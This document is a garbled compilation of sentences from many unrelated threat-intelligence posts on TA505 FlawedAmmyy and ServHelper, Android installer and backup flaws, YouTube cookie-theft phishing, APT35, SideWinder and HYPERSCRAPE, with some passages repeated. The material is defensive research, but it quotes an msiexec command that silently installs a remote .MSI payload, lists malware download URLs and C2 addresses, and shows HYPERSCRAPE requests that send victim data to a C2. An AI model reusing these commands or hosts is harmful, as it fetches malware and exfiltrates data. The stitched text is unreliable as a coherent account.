Figure 9. Infection chains for FlawedAmmyy installation Figure 10.
Screenshot of decompiled script from the .ISO file with a .NET downloader embedded in the e-ticket.
"Other samples also included an Excel file attachment with malicious macros that install FlawedAmmyy, or a URL included in the email that supposedly downloads the file needed to download the malware."
Figure 11. .LNK embedded in the .ISO file
"Both versions tried to download and execute files km1 or km2, an .MSI installer that executes the FlawedAmmyy downloader."
"This, in turn, downloads an RC4-encrypted FlawedAmmyy RAT payload from hxxp://92[.]38[.]135[.]67/2.dat or hxxp://27[.]102[.]70[.]196/1.dat that automatically decrypts and executes the malware."
"Opening the documents will enable the macros and download the same FlawedAmmyy downloader as the .ISO file iteration from hxxp://92[.]38[.]135[.]67 or hxxp://27[.]102[.]70[.]196, with filenames k1 or k2."
Infection chains for ServHelper installation with .NET downloader
"The .NET downloads jm1 — an .MSI installer — that installs another NSIS installer, leading to a ServHelper infection in the system."
Figure 13.
The decompiled .NET downloader
"In another routine, an Excel file attachment downloads the NSIS installer once the user enables the malicious macros from hxxp://109[.]234[.]37[.]15:80/j1 or hxxp://169[.]239[.]128[.]170/j1."
"More typical TA505 campaigns, with old and new targets"
Enabling the macros of the Excel file downloads a file created using NSIS installer with ServHelper from 79[.]141[.]168[.]105 or 195[.]123[.]213[.]126.
The emails used in these campaigns used subjects pertaining to finance or urgent concerns on insurance policies.
"Similar to the routine variant in Figure 6, the Excel VBA macros retrieve the FlawedAmmyy downloader from hxxp://195[.]123[.]245[.]185/r1 or hxxp://185[.]225[.]17[.]5/r1, in then decrypts and executes FlawedAmmyy RAT from hxxp://185[.]225[.]17[.]5/2.dat or hxxp://195[.]123[.]245[.]185/1.dat."
"Meanwhile, the .DOC VBA macros retrieves the MSI files from hxxp://195.123.245.185/km or hxxp://185.225.17.5/km, which executes the NSIS installer for ServHelper installation."
Figure 14.
One of the more typical techniques employed by TA505. .DLL downloaders that deliver FlawedAmmyy and newly styled macros
"While FlawedAmmyy RAT was still the final payload, the downloader was different — this operation used a .DLL variant."
Figure 15.
Infection chain with .DLL FlawedAmmyy downloader
"The attached document asks the user to enable the macros, which creates an Internet Explorer object instance."
Figure 16.
Figure 17.
Text file using Internet Explorer for communication to bypass firewall rules.
The downloaded file is a text file with a single number on each line.
The macros process the downloaded payload with each number encrypted in XOR with a constant hardcoded value of 106.
Figure 18.
The unpacked payload in memory is also a .DLL — it's the first time we've seen a FlawedAmmyy downloader as a .DLL.
"As we further analyzed the main behavior by downloading the encrypted FlawedAmmyy RAT and decrypted it with RC4, we found that it was similar to the previous campaigns, but with a few updates."
"The first update is the use of the socket API to send an HTTP request instead of wininet or winhttp API to download an encrypted FlawedAmmyy, building an HTTP header by itself."
This could likely be an effort to bypass API hooking for HTTP.
Figure 19.
Send HTTP request using socket API
The second change: The decrypted FlawedAmmyy RAT is now saved as dllhots.exe in C:\temp\ (it used to be saved as wsus.exe).
"Lastly, this new FlawedAmmyy downloader overwrites some PE header members with random values."
Figure 20.
Original PE header members (left) vs. overwritten header members (right)
The decrypted FlawedAmmyy RAT slightly different from the one that TA505 reused over its past campaigns.
"While the previous strings had the modified AmmyyAdmin binary since the source code was leaked, TA505 changed the strings in this sample to PopssAdmin."
Figure 21.
Significant changes in the binary
We also found that the file delivered is an .MSI executable containing the same .DLL FlawedAmmyy downloader.
Figure 23.
Final command strings in document’s “tag” properties.
"The final command executes the download and installation of the .MSI file into C:\Windows\System32\msiexec.exe"" back=13 error=continue /i http://92[.]38[.]135[.]99/99.msi /q OnLoad=""c:\windows\notepad.exe Figure 24."
.MSI file installed in the system
"The other three parameters do not appear to be used at all, as reported in the install log (by adding /L*V ""C:\example.log"" parameter)."
"The .MSI file is a downloader with the .DLL FlawedAmmyy downloader inside; it retrieves the final payload, then decrypts and executes FlawedAmmyy RAT."
Figure 25.
Unused parameters from
log
"This .MSI file delivers the NSIS-packed ServHelper, and the binary shares the same C&C server as the campaign targeting Saudi Arabia, Oman, Qatar, and Turkey."
"Suspicious activity using ServHelper A campaign targeting China spoofed FedEx-themed emails with subjects pertaining to delivery problems, failures, or notifications."
"Instead of attachments, it had malicious URLs in the message content that lead to the download of a malicious document named fedex.doc from hxxp://www.fedexdocs[.]top/fedex.doc or hxxp://www.fedexdocs[.]icu/fedex.doc."
"The VBA macro in the document downloads an NSIS-packed executable from hxxps://senddocs[.]icu/stelar.exe, which installs ServHelper."
"However, while initial analysis of the macro it used made us believe that this was from TA505, the macros’ obfuscation and style turned out to be more similar to the ones described in this post, based on the code page, senders, and fast flux."
Conclusion
"As they continue to target businesses in different sectors, we can expect TA505 to keep using phishing and social engineering techniques to compromise systems."
"Trend Micro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
"Microsoft has since updated the FAQ section of the advisory that shows CVE-2021-34527 is similar but distinct from CVE-2021-1675, which addresses a different but related vulnerability in RpcAddPrinterDriverEx()."
"Today, Palo Alto Networks researcher Claud Xiao is delivering a presentation titled “Insecure Internal Storage in Android” at the Hacks in Taiwan Conference (HITCON). Claud is discussing techniques for accessing private data in Android’s internal storage system using the Android Debug Bridge (ADB) backup/restore functionality."
"While there is still debate about how to store passwords in internal storage, if Android internal storage isn’t accessible to anything but the application that owns it, it remains secure."
"If an attacker has control over a PC, which the Android device is attached to (for charging or for other purposes), they don’t need to get physical access to the phone."
Or through a rogue “charging station” which users plug their device into without thought. 2.
"Next, the device must support ADB backup, which was not introduced until Android 4.0 (Ice Cream Sandwich)."
"As of July 7, this includes 85.8% of active Android devices."
"For these devices, ADB debugging must be enabled for backup to work."
Some device vendors have even left it enabled by default when shipping their phones.
If the device is running Android 4.2.2 or above (approximately 54.3% of active devices) it uses ADB authentication.
"Finally, when an ADB backup is initiated, a window pops up on the device screen to ask the user to press “Back up my data.”"
"Of the 12,351 applications on the Google Play store with > 500,000 installations, only 556 explicitly disable this backup system."
Another 156 implement a BackupAgent that restricts which data is subject to the backup.
The other 94.2% of applications place no restrictions on the backup of their internal storage data.
"This includes (as discussed earlier) the default Android Mail and Browser applications, but also other e-mail, SSH and FTP applications, many of which store login and password details without any additional encryption."
"Google could reverse this situation by making setting the android:allowBackup property to false by default, requiring developers to opt-in to the backup system, rather than opt-out."
What a difference a year makes in the threat environment.
"But when April 2017 came, Rig started a very marked decline."
"As shown below, the volume of coinmining increase nearly 2,800% in a year."
We can’t say why this shift is happening.
"It could be there is a shift from ransomware due to a declining return on investment because people no longer willing to pay ransom in the wake of WannaCry/ WanaCrypt0r, and Petya/NotPetya."
"This post is also available in: 日本語 (Japanese) As part of Palo Alto Networks Unit 42’s ongoing monitoring of the Shamoon 2 situation, we have updated information since our last posting Threat Brief: Second Wave of Shamoon 2 Attacks Reveal Possible New Tactic."
"Since that Threat Brief, our Unit 42 researchers have become aware of another wave of Shamoon 2 attacks."
"This third wave was set to wipe systems using the Disttrack malware on January 23, 2017."
"In order to understand how this works, let’s first take a look at how Android installs apps."
Android supports the ability to install apps from the Google Play store as well as from the local file system.
Google Play downloads Android packages (APKs) to a protected space of the file system.
Both methods use a system application called PackageInstaller to complete the installation.
Let’s take a closer look at what happens.
"Verified with Android OS source code posted in AOSP, it shows that the PackageInstaller on affected versions does not verify the APK file at the “Time of Use”."
This method has several stages:
"Method B: Self modifying the APK This exploit can take advantage of the same vulnerability to mask what permissions the app really requires. This vulnerability affects Android device users as well as Android app developers. For Android device users, the users may end up with installing apps that are not the ones they agree to install. Android app developers are also affected, because app-store apps and mobile ads libraries that do not rely on Google Play store would be likely to save the promoted apps in unprotected storage, e.g. /sdcard."
"According to source code posted on the AOSP website, Android 4.3_r0.9 introduced a hash check of the Android manifest that is verified between “Time to Check” and “Time to Use”."
"For instance, we have successfully tested this exploit on Samsung Galaxy S4 Android phones running Android 4.3 (Build version JSS15J.I337UCUEMK2, Built on Nov. 16, 2013), and Amazon Fire OS version 13.3.2.5."
We encourage all Android device vendors to verify the existence of this vulnerability on their devices including those with Android 4.3.
Palo Alto Networks has published a vulnerability scanner app in the Google Play store.
From Google: “Android Open Source Project includes patches for this issue for Android 4.3 and later.
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
A few were observed displaying a fake error message requiring user click-through to continue execution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"In this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users."
"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit."
Users were instructed to activate an invitation to a (fake) webinar by logging in.
The phishing kit will also ask for second-factor authentication codes sent to devices.
"APT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security."
Credential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.
"In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store."
"Although Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021."
One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.
"When they did, attackers sent them phishing links in follow-on correspondence."
Targets typically had to navigate through at least one redirect before landing on a phishing domain.
One of APT35’s novel techniques involves using Telegram for operator notifications.
The attackers embed javascript into phishing pages that notify them when the page has been loaded.
"The attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time."
We warn users when we suspect a government-backed threat like APT35 is targeting them.
"When a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results."
Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf
Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info
Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection Android App C2: communication-shield[.]site cdsa[.]xyz
Understanding the techniques used by attackers helps us counter these threats effectively.
We believe this is a technique the attacker is using to evade detection rules.
"Code signatures on Windows executables provide guarantees about the integrity of a signed executable, as well as information about the identity of the signer."
"Since mid-August, OpenSUpdater samples have carried an invalid signature, and further investigation showed this was a deliberate attempt to evade detection."
Bytes: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 00 00
"As shown in the following screenshot, the signature is considered to be valid by the Windows operating system."
"Since first discovering this activity, OpenSUpdater's authors have tried other variations on invalid encodings to further evade detection."
The following are samples using this evasion: https://www.virustotal.com/gui/file/5094028a0afb4d4a3d8fa82b613c0e59d31450d6c75ed96ded02be1e9db8104f/detection New variant: https://www.virustotal.com/gui/file/5c0ff7b23457078c9d0cbe186f1d05bfd573eb555baa1bf4a45e1b79c8c575db/detection
"Updated January 8, 2020 5PM EST with a video showing the exploit of CVE-2019-2215."
"One of these apps, called Camero, exploits CVE-2019-2215, a vulnerability that exists in Binder (the main Inter-Process Communication system in Android)."
This is the first known active attack in the wild that uses the use-after-free vulnerability.
We speculate that these apps have been active since March 2019 based on the certificate information on one of the apps.
The apps have since been removed from Google Play.
Figure 1. The three apps related to SideWinder group Figure 2.
Certificate information of one of the apps Installation SideWinder installs the payload app in two stages.
We found that the group employs Apps Conversion Tracking to configure the C&C server address.
The address was encoded by Base64 then set to referrer parameter in the URL used in the distribution of the malware.
Figure 3.
Parsed C&C Server address
All of this is done without user awareness or intervention.
"After downloading the extra DEX file from the C&C server, the second-layer droppers invoke extra code to download, install, and launch the callCam app on the device."
Figure 4. Two-stage payload deployment Figure 5. Code showing how the dropper invokes extra DEX code To deploy the payload app callCam on the device without the user’s awareness
", SideWinder does the following: 1. Device Rooting This approach is done by the dropper app Camero and only works on Google Pixel (Pixel 2, Pixel 2 XL), Nokia 3 (TA-1032), LG V20 (LG-H990), Oppo F9 (CPH1881), and Redmi 6A devices."
The malware retrieves a specific exploit from the C&C server depending on the DEX downloaded by the dropper.
Figure 6.
Code snippet from Extra DEX downloaded by Camero
We were able to download five exploits from the C&C server during our investigation.
MediaTek-SU exploit
"After acquiring root privilege, the malware installs the app callCam, enables its accessibility permission, and then launches it. Figure 9."
Commands
"After its launch, the app asks the user to enable accessibility."
Figure 10. Steps FileCrypt Manager prompts user to do
"Once granted, the app shows a full screen window that says that it requires further setup steps."
"In reality, that is just an overlay screen that is displayed on top of all activity windows on the device."
Overlay screen
"Meanwhile, the app invokes code from the extra DEX file to enable the installation of unknown apps and the installation of the payload app callCam."
"All of this happens behind the overlay screen, unbeknownst to the user."
Code enable accessibility permission of the newly installed app
&amp;amp;amp;amp;amp;nbsp; callCam’s Activities
The app callCam hides its icon on the device after being launched.
Sensor information Camera information Screenshot Account Wifi information
"Data of WeChat, Outlook, Twitter, Yahoo Mail, Facebook, Gmail, and Chrome The app encrypts all stolen data using RSA and AES encryption algorithms."
"When encrypting, it creates a block of data we named headData."
"This block contains the first 9 bytes of origin data, origin data length, random AES IV, the RSA-encrypted AES encrypt key, and the SHA256 value of AES-encrypted origin data."
Then the headData is encoded through the customized routine.
"After the encoding, it is stored in the head of the final encrypted file followed by the data of the AES-encrypted original data."
Figure 14.
Data encryption process Figure 15.
Customized encoding routine done Relation to SideWinder
"In addition, a URL linking to one of the apps’ Google Play pages is also found on one of the C&C servers."
Figure 16.
Google Play URL of FileManager app found in one of the C&C servers.
"Trend Micro’s Mobile App Reputation Service (MARS) covers Android and iOS threats using leading sandbox and machine learning technologies to protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerabilities. Indicators of Compromise SHA256 Package Name/File type App Name/Detection Name ec4d6bf06dd3f94f4555d75c6daaf540dee15b18d62cc004e774e996c703cb34 DEX AndroidOS_SWinderSpy.HRXA a60fc4e5328dc75dad238d46a2867ef7207b8c6fb73e8bd001b323b16f02ba00 DEX AndroidOS_SWinderSpy.HRXA"
0daefb3d05e4455b590da122255121079e83d48763509b0688e0079ab5d48886
ELF AndroidOS_MtkSu.A 441d98dff3919ed24af7699be658d06ae8dfd6a12e4129a385754e6218bc24fa ELF AndroidOS_BinderExp.A ac82f7e4831907972465477eebafc5a488c6bb4d460575cd3889226c390ef8d5 ELF AndroidOS_BinderExp.A ee679afb897213a3fd09be43806a7e5263563e86ad255fd500562918205226b8 ELF AndroidOS_BinderExp.A 135cb239966835fefbb346165b140f584848c00c4b6a724ce122de7d999a3251 ELF
AndroidOS_MtkSu.A a265c32ed1ad47370d56cbd287066896d6a0c46c80a0d9573d2bb915d198ae42 com.callCam.android.callCam2base callCamm
FileCrypt Manager com.callCam.android.callCam2base callCamm com.camero.android.camera2basic Camero
C&C Servers ms-ethics.net
deb-cn.net ap1-acl.net m s-db.net
Figure 1. Diagram showing how the BEC scam is carried out Background
Thank you for your understanding.
The email contained two PDF file attachments.
Figure 3. Letter confirming the changes in the company’s bank reference.
"Meanwhile, the second PDF file shows the banking account reference number: Figure 4."
Initial investigation
"A perceptive employee could potentially identify this as something unusual, which raises red flags."
Figure 5.
The PDF file showing the banking account reference.
We investigated the name shown on the account but did not find any useful information other than the fact that this name is used mostly in the Ivory Coast in Africa.
Table 1. Domains registered using the email address
This is BEC as we usually know it.
"A little over two weeks before the registration of the fake domain, the attackers sent the following email to the company: Figure 6."
"The initial email sent by the malicious actors, allegedly from the General Directorate of Public Finances (DGFiP) of France, concerning tax inquiries The email contained an attached PDF file that seemed to be a letter from the French Tax service: Figure 7."
"While thanking you for your cooperation, please believe in the assurance of my distinguished feelings."
The use of tax-related scams is something we’ve seen before.
We also helped close the fraudulent domains.
"As such, here are some tips on how to stay safe from these online schemes: Carefully scrutinize all emails."
Raise employee awareness.
Always verify requests.
Indicators of Compromise (IoCs) Domains dgfip-finances-gouv[.]cloud bellingstudio@gmail.com Tags
This highlights how the cybercrime underground in the Middle East/North African region (covered in our paper titled Digital Souks: A Glimpse into the Middle Eastern and North African Underground) can expand their activity into areas beyond their original area of expertise.
DiscoveryOur first inkling of this threat came when we spotted a spear-phishing email campaign targeting several embassies of various European countries.
"Once the multiple layers of script obfuscation are removed, the final payload arrives—a version of the njRAT Trojan; this family has been a known threat since 2015."
The obfuscation used was not particularly sophisticated.
"We believe that this specific VBS obfuscation script was created by the N7r team, a North African hacking group known for making video tutorials on using common RATs (that this particular script wasn’t part of any such videos)."
"The new emails used more common phishing tactics, such as alleged requests for payment confirmation."
At least one message was sent to a diplomat based in the island of Saint Martin after Hurricane Irma hit.
"The attachments used in this second wave was more sophisticated, but barely so."
The payload was still njRAT.
"These Yara rules allowed us to find other samples, which delivered other basic RATs like H-Worm, Luminosity, and RemCOS."
"Some of these domains were also tied to banking malware, confirming our attacker was not limited to embassies."
OPSEC 101 – Or How Not To Do OPSECGathering the above information was enough to protect our customers.
The attacker almost always sent his mails from a Libyan IP address.
"In some cases, compromised SMTP servers belonging to the hotels he had breached were used."
"He didn’t bother using services which hid his IP addresses from mail headers, which allowed us to correlate these addresses to a dynamic DNS domain used by the attacker."
We also checked the registrant data of the domains used by the attacker.
"This information was exceptionally useful, as it allowed us to find multiple Facebook accounts controlled by the threat actor."
We then confirmed his location (Libya) as well as his probable identity.
Figure 1. Stolen document posted on Facebook (Click to enlarge)
He didn't just post embassy documents on Facebook: he also posted stolen credit cards and screens of defaced websites.
Figure 2. Stolen credit cards (Click to enlarge)
This threat actor first published stolen documents in April 2016.
His motives remain unclear since the documents themselves did not contain any particularly unusual information.
Indicators of CompromiseFiles with the following hashes were used in the first series of attacks: cd8329f75b1393ead3e16c6c79ee1ab476e6487370481e5931feb63305f00983 – detected as VBS_KEYLOG.NYKW f46f0e8eed0361294200d64e87b3fb13f6a3797f99f5b588444534f27612a590 – archive file;
contents detected as VBS_KEYLOG.NYKW fd883a978dd6d95fa5c3b5e0a154e0e07b06e7cb6c685f1ca9f58c73122df24d – archive file; contents detected as VBS_KEYLOG.NYKW 7413c7c0317e49e49d595408f721c2ab2f120215374accf2f8133c9d9ad603fb – detected as WORM_DUNIHI.AUSHH 89427241e26748949c235fc43805c72960d9c2711fa72036c33137648bb475fa – detected as VBS_REMCOS.B
"Files with the following hashes were used in the second series of attacks: fb5b5906feab268f90789b15351b8a193fb5f445a3ae9afb1da8fb814ed80325 – detected as VBS_KEYLOG.NYKW 306f4f843c5a5a119a3385ad2b18c78a04fac618031ddecabf0633083a6c9a76 – detected as VBS_KEYLOG.NYKW 33709ca050fd0abc2aba38326996bf1c3b6d9b875228c9f15e624f9002c199a8 – detected as VBS_OBFUS.VUJ ff0f9057d3da7b3500f145ce24670c89a93cdb5cbe74946b17397fc466ddfbda – detected as VBS_AUTORUN.ASUHK 9b7cc8f4807df162f99f5fa592bc7cc5c6a756d9c0311c7b2529f19a0ac59c1a – archive file; contents detected as VBS_OBFUS.VUK 587e38fb11bd0c4021ce6965e92838521616ee4c5506ef0fa160452e9c71d5cf – detected as VBS_OBFUS.VUK Tags APT & Targeted Attacks | Malware | Research | Articles, News, Reports"
"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts."
The attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.
We have seen it deployed against fewer than two dozen accounts located in Iran.
HYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.
"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives."
"HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired."
HYPERSCRAPE won't run unless in a directory with other file dependencies.
In later versions it was obfuscated with Base64.
GET http://{C2}/Index.php?Ck=OK HTTP/1.1
Accept-Encoding: gzip Connection: Keep-Alive
A new form is displayed if the information is not provided via command prompt.
"Again, the response is expected to be ""OK""."
GET http://{C2}/Index.php?vubc={identity} HTTP/1.1
"A new folder named ""Download"" is created adjacent to the main binary."
The browser then navigates to Gmail to begin the data collection.
"If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page."
"Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not."
The language is returned to its original setting when the run is finished.
HYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.
A log file is written containing a count of the emails that were downloaded.
"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }"
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") ||"
"x.TextContent.StartsWith(""Review blocked sign-in attempt"") || x.TextContent."
"x.TextContent.StartsWith(""Access for less secure apps has been turned on"") select x).ToList"
GeckoHtmlElement > (
"public void ManageTakeOut() { string text = ""PipeName"";"
jsonInfo.Data = this.OperationObject.GetUsername(); pipeCommunication.Write(jsonInfo); break; } }
pipeCommunication.Close(); }
We’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.
C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries
03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\EmailDownloader\obj\Debug\EmailDownloader.pdb E:\Working\Projects\EmailDownloader\EmailDownloaderCookieMode\Mahdi\LiveLib\obj\Release\LiveLib.pdb
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2022.
"It was last updated on July 29, 2022."
We use our research to continuously improve the safety and security of our products and share this intelligence with our industry peers.
And we don’t just plug security holes – we work to eliminate entire classes of threats for consumers and businesses whose work depends on the Internet.
We observed fewer than three dozen installs of this spyware.
NSO Group continues to pose risks across the Internet ecosystem.
"In 2019, we confronted the risks posed by NSO Group again, relying upon NSO Groups’s marketing information suggesting that they had a 0-day exploit for Android."
"In December 2021, we released research about novel techniques used by NSO Group to compromise iMessage users."
"We believe its use is growing, fueled by demand from governments."
We have also observed proliferation risk from nation state actors attempting to gain access to the exploits of these vendors.
"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret can pose a severe risk to the Internet when the vendor itself gets compromised."
"This has happened to multiple spyware vendors over the past ten years, raising the specter that their stockpiles can be released publicly without warning."
"The proliferation of commercial hacking tools is a threat to national security, making the Internet less safe and undermining the trust on which a vibrant, inclusive digital society depends."
Safe Browsing also notifies webmasters when their websites are compromised by malicious actors and helps them diagnose and resolve the problem so that their visitors stay safer.
"On Gmail, we recommend certain Gmail security precautions to prevent spoofing, phishing, and spam."
"We use email authentication to protect against email spoofing, which is when email content is changed to make the message appear from someone or somewhere other than the actual source."
And we offer other advanced phishing and malware protection to administrators to better protect their users.
"During the development stage, Android-created and open source components are subject to vigorous security reviews"
"For users, Android provides safety and control over how apps and third parties can access the data from their devices."
"APP has a strong track record protecting users – since the program’s inception, there are no documented cases of an account compromise via phishing."
The first step is to understand the scope of the problem.
Any one government’s ability to meaningfully impact this market is limited; only through a concerted international effort can this serious risk to online safety be mitigated.
"While we continue to fight these threats on a technical level, the providers of these capabilities operate openly in democratic countries."
"With so much diversity in the attack surface, it’s important to leverage security best practices to manage your cyber risk."
Get advice here: https://success.trendmicro.com
Pay close attention to unrecognized network traffic (both inbound and outbound) and watch for sophisticated new phishing attacks.
"Where possible, reduce your attack surface."
How to do that?
Our research teams and threat hunters will work vigilantly to monitor and identify any new threat intelligence and will continue to share updates here: trendmicro.com/ukrainecrisis.
This blog has been revised to include new facts that have been released since the original posting.
"Tags Cloud | Cyber Crime | Exploits & Vulnerabilities | Expert Perspective | Phishing | Cyber Threats | APT & Targeted Attacks | Endpoints | Mobile | Articles, News, Reports"
"This is the second directive the TSA issued to the pipeline sector this 2021, building on the initial Security Directive released on May 2021 following the ransomware attack on Colonial Pipeline by DarkSide."
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
A few were observed displaying a fake error message requiring user click-through to continue execution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"In this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users."
"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit."
Users were instructed to activate an invitation to a (fake) webinar by logging in.
The phishing kit will also ask for second-factor authentication codes sent to devices.
"APT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security."
Credential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.
"In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store."
"Although Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021."
One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.
"When they did, attackers sent them phishing links in follow-on correspondence."
Targets typically had to navigate through at least one redirect before landing on a phishing domain.
